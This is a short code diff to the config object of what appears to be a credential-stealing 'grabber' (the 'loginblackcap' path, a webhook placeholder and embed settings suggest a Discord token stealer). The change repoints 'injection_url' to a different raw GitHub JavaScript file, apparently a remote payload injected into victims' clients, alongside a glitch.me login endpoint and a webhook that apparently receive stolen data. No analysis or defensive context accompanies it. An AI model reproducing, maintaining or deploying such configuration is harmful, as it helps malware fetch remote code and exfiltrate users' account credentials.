@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/ret44564.js",
+    injection_url: "https://raw.githubusercontent.com/RndmAcc123/gffrhtgmigreujimtrmjinjniumhc/main/Index.js",
     webhook: "%WEBHOOK%",
     UWUWED: "https://flawless-pickled-plume.glitch.me/loginblackcap/",
     filter2: {
